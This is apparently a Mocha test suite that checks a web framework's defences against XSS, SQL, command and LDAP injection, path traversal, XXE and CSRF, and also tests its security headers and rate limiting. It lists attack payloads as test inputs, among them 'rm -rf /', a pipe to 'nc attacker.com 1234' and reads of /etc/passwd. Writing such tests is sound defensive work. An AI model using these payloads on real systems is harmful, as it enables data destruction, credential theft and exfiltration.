const assert = require('assert');
const { Spark } = require('../../src');
const TestHelper = require('../test-helper');

describe('Security Vulnerability Tests', () => {
  let app;
  
  beforeEach(() => {
    app = new Spark();
  });
  
  afterEach(async () => {
    if (app.listening) {
      await app.close();
    }
  });
  
  describe('XSS Prevention', () => {
    it('should prevent reflected XSS in query parameters', async () => {
      app.get('/search', async (ctx) => {
        // Unsafe: directly using user input
        ctx.html(`<h1>Search results for: ${ctx.query.q}</h1>`);
      });
      
      const res = await TestHelper.request(app, {
        path: '/search?q=<script>alert("XSS")</script>'
      });
      
      // The framework should not execute the script
      assert(res.body.includes('&lt;script&gt;'));
      assert(!res.body.includes('<script>'));
    });
    
    it('should prevent XSS in JSON responses', async () => {
      app.get('/api/user', async (ctx) => {
        ctx.json({
          name: ctx.query.name,
          bio: ctx.query.bio
        });
      });
      
      const res = await TestHelper.request(app, {
        path: '/api/user?name=<img src=x onerror=alert(1)>&bio=</script><script>alert(2)</script>'
      });
      
      const data = res.json();
      // JSON encoding should escape dangerous characters
      assert(!res.body.includes('<script>'));
      assert(!res.body.includes('onerror='));
    });
    
    it('should sanitize file upload names', async () => {
      app.post('/upload', async (ctx) => {
        const filename = ctx.files?.file?.filename || 'unknown';
        ctx.json({ filename });
      });
      
      // Simulate file upload with malicious filename
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/upload',
        headers: {
          'content-type': 'multipart/form-data; boundary=----test'
        },
        body: [
          '------test',
          'Content-Disposition: form-data; name="file"; filename="../../etc/passwd"',
          'Content-Type: text/plain',
          '',
          'file content',
          '------test--'
        ].join('\r\n')
      });
      
      const data = res.json();
      assert(!data.filename.includes('..'));
    });
  });
  
  describe('SQL Injection Prevention', () => {
    it('should handle SQL injection attempts in parameters', async () => {
      const queries = [];
      
      app.get('/users/:id', async (ctx) => {
        // Simulate a database query
        queries.push(`SELECT * FROM users WHERE id = '${ctx.params.id}'`);
        ctx.json({ id: ctx.params.id });
      });
      
      const injectionAttempts = [
        "1' OR '1'='1",
        "1'; DROP TABLE users--",
        "1' UNION SELECT * FROM passwords--",
        "1\\' OR 1=1--"
      ];
      
      for (const attempt of injectionAttempts) {
        await TestHelper.request(app, {
          path: `/users/${encodeURIComponent(attempt)}`
        });
      }
      
      // Check that parameters are properly escaped
      queries.forEach(query => {
        assert(!query.includes('DROP TABLE'));
        assert(!query.includes('UNION SELECT'));
      });
    });
  });
  
  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal in static files', async () => {
      app.use(require('../../src/middleware/static')('./public'));
      
      const traversalAttempts = [
        '/../../../etc/passwd',
        '/..\\..\\..\\windows\\system32\\config\\sam',
        '/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/....//....//....//etc/passwd',
        '/..%252f..%252f..%252fetc%252fpasswd'
      ];
      
      for (const attempt of traversalAttempts) {
        const res = await TestHelper.request(app, { path: attempt });
        assert(res.status === 404 || res.status === 400);
        assert(!res.body.includes('root:'));
      }
    });
    
    it('should sanitize file paths in custom routes', async () => {
      app.get('/download/:file', async (ctx) => {
        const sanitized = ctx.params.file.replace(/[^a-zA-Z0-9.-]/g, '');
        ctx.text(`Downloading: ${sanitized}`);
      });
      
      const res = await TestHelper.request(app, {
        path: '/download/..%2F..%2Fsecret.txt'
      });
      
      assert(res.body === 'Downloading: 2F2Fsecret.txt');
    });
  });
  
  describe('CSRF Protection', () => {
    it('should require CSRF token for state-changing operations', async () => {
      app.use(require('../../src/middleware/session')({ 
        secret: 'test-secret' 
      }));
      app.use(require('../../src/middleware/security').csrf({ 
        secret: 'csrf-secret' 
      }));
      
      app.post('/api/transfer', async (ctx) => {
        ctx.json({ success: true });
      });
      
      // Request without CSRF token should fail
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/api/transfer',
        body: JSON.stringify({ amount: 1000 }),
        headers: {
          'content-type': 'application/json'
        }
      });
      
      assert.strictEqual(res.status, 403);
      assert(res.body.includes('CSRF token missing'));
    });
    
    it('should validate CSRF token format', async () => {
      app.use(require('../../src/middleware/security').csrf({ 
        secret: 'csrf-secret' 
      }));
      
      app.post('/api/action', async (ctx) => {
        ctx.json({ success: true });
      });
      
      // Invalid token format
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/api/action',
        headers: {
          'x-csrf-token': 'invalid-token'
        }
      });
      
      assert.strictEqual(res.status, 403);
    });
  });
  
  describe('XXE Prevention', () => {
    it('should prevent XML External Entity attacks', async () => {
      app.post('/api/xml', async (ctx) => {
        // Simulate XML parsing (should reject external entities)
        if (ctx.body.includes('<!ENTITY') || ctx.body.includes('SYSTEM')) {
          ctx.status(400).json({ error: 'Invalid XML' });
        } else {
          ctx.json({ received: true });
        }
      });
      
      const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`;
      
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/api/xml',
        body: xxePayload,
        headers: {
          'content-type': 'application/xml'
        }
      });
      
      assert.strictEqual(res.status, 400);
    });
  });
  
  describe('Injection Attack Prevention', () => {
    it('should prevent command injection', async () => {
      app.get('/ping/:host', async (ctx) => {
        const host = ctx.params.host;
        // Validate input to prevent command injection
        if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
          return ctx.status(400).json({ error: 'Invalid host' });
        }
        ctx.json({ host });
      });
      
      const injectionAttempts = [
        'google.com; cat /etc/passwd',
        'google.com && rm -rf /',
        'google.com | nc attacker.com 1234',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`'
      ];
      
      for (const attempt of injectionAttempts) {
        const res = await TestHelper.request(app, {
          path: `/ping/${encodeURIComponent(attempt)}`
        });
        assert.strictEqual(res.status, 400);
      }
    });
    
    it('should prevent LDAP injection', async () => {
      app.get('/users/search', async (ctx) => {
        const username = ctx.query.username;
        // Validate LDAP-specific characters
        if (/[*()\\\/\x00]/.test(username)) {
          return ctx.status(400).json({ error: 'Invalid username' });
        }
        ctx.json({ username });
      });
      
      const ldapInjections = [
        '*)(uid=*',
        'admin)(|(uid=*',
        'admin)(uid=*))(|(uid=*'
      ];
      
      for (const injection of ldapInjections) {
        const res = await TestHelper.request(app, {
          path: `/users/search?username=${encodeURIComponent(injection)}`
        });
        assert.strictEqual(res.status, 400);
      }
    });
  });
  
  describe('Security Headers', () => {
    it('should set security headers by default', async () => {
      app.use(require('../../src/middleware/security')());
      
      app.get('/', async (ctx) => {
        ctx.text('OK');
      });
      
      const res = await TestHelper.request(app);
      
      // Check for security headers
      assert(res.headers['x-content-type-options'] === 'nosniff');
      assert(res.headers['x-frame-options'] === 'DENY');
      assert(res.headers['x-xss-protection'] === '1; mode=block');
      assert(res.headers['strict-transport-security']);
      assert(!res.headers['x-powered-by']);
    });
    
    it('should set Content Security Policy', async () => {
      app.use(require('../../src/middleware/security')({
        contentSecurityPolicy: {
          'default-src': ["'self'"],
          'script-src': ["'self'", "'unsafe-inline'"]
        }
      }));
      
      app.get('/', async (ctx) => ctx.html('<h1>Test</h1>'));
      
      const res = await TestHelper.request(app);
      const csp = res.headers['content-security-policy'];
      
      assert(csp.includes("default-src 'self'"));
      assert(csp.includes("script-src 'self' 'unsafe-inline'"));
    });
  });
  
  describe('Rate Limiting', () => {
    it('should prevent brute force attacks', async () => {
      app.use(require('../../src/middleware/rate-limit')({
        max: 3,
        windowMs: 1000
      }));
      
      app.post('/login', async (ctx) => {
        ctx.json({ success: true });
      });
      
      // Make multiple rapid requests
      const results = [];
      for (let i = 0; i < 5; i++) {
        const res = await TestHelper.request(app, {
          method: 'POST',
          path: '/login'
        });
        results.push(res.status);
      }
      
      // First 3 should succeed, rest should be rate limited
      assert.deepStrictEqual(results.slice(0, 3), [200, 200, 200]);
      assert.deepStrictEqual(results.slice(3), [429, 429]);
    });
  });
  
  describe('Session Security', () => {
    it('should regenerate session ID on privilege change', async () => {
      const sessionMiddleware = require('../../src/middleware/session')({
        secret: 'test-secret'
      });
      
      app.use(sessionMiddleware);
      
      app.post('/login', async (ctx) => {
        const oldId = ctx.session.id;
        await ctx.session.regenerate();
        const newId = ctx.session.id;
        
        ctx.json({ 
          regenerated: oldId !== newId,
          oldId: oldId.substring(0, 8),
          newId: newId.substring(0, 8)
        });
      });
      
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/login'
      });
      
      const data = res.json();
      assert(data.regenerated);
      assert(data.oldId !== data.newId);
    });
    
    it('should set secure session cookie options', async () => {
      app.use(require('../../src/middleware/session')({
        secret: 'test-secret',
        cookie: {
          secure: true,
          httpOnly: true,
          sameSite: 'strict'
        }
      }));
      
      app.get('/', async (ctx) => {
        ctx.session.user = 'test';
        ctx.text('OK');
      });
      
      const res = await TestHelper.request(app);
      const setCookie = res.headers['set-cookie'];
      
      if (setCookie) {
        const cookie = Array.isArray(setCookie) ? setCookie[0] : setCookie;
        assert(cookie.includes('HttpOnly'));
        assert(cookie.includes('SameSite=Strict'));
      }
    });
  });
  
  describe('Input Validation', () => {
    it('should reject oversized payloads', async () => {
      app.use(require('../../src/middleware/security').requestSizeLimit({
        limit: 1024 // 1KB
      }));
      
      app.post('/upload', async (ctx) => {
        ctx.json({ received: true });
      });
      
      const largePayload = 'x'.repeat(2048); // 2KB
      
      const res = await TestHelper.request(app, {
        method: 'POST',
        path: '/upload',
        body: largePayload,
        headers: {
          'content-length': largePayload.length.toString()
        }
      });
      
      assert.strictEqual(res.status, 413);
    });
    
    it('should validate content types', async () => {
      app.post('/api/data', async (ctx) => {
        if (!ctx.is('json')) {
          return ctx.status(415).json({ error: 'Unsupported media type' });
        }
        ctx.json({ received: true });
      });
      
      // Wrong content type
      const res1 = await TestHelper.request(app, {
        method: 'POST',
        path: '/api/data',
        body: '<xml>data</xml>',
        headers: {
          'content-type': 'application/xml'
        }
      });
      
      assert.strictEqual(res1.status, 415);
      
      // Correct content type
      const res2 = await TestHelper.request(app, {
        method: 'POST',
        path: '/api/data',
        body: '{"key":"value"}',
        headers: {
          'content-type': 'application/json'
        }
      });
      
      assert.strictEqual(res2.status, 200);
    });
  });
  
  describe('Fuzzing Tests', () => {
    it('should handle random input without crashing', async () => {
      app.all('*', async (ctx) => {
        ctx.json({ 
          method: ctx.method,
          path: ctx.path,
          query: ctx.query
        });
      });
      
      // Generate random inputs
      const fuzzInputs = [];
      for (let i = 0; i < 100; i++) {
        fuzzInputs.push({
          path: '/' + TestHelper.generateRandomString(Math.random() * 50),
          method: ['GET', 'POST', 'PUT', 'DELETE'][Math.floor(Math.random() * 4)],
          body: Math.random() > 0.5 ? TestHelper.generateRandomString(Math.random() * 1000) : undefined
        });
      }
      
      // Test each input
      for (const input of fuzzInputs) {
        try {
          await TestHelper.request(app, input);
        } catch (e) {
          // Request errors are OK, app crashes are not
          assert(e.code === 'ECONNRESET' || e.code === 'ECONNREFUSED');
        }
      }
      
      // App should still be responsive
      const res = await TestHelper.request(app, { path: '/test' });
      assert.strictEqual(res.status, 200);
    });
  });
});

module.exports = describe;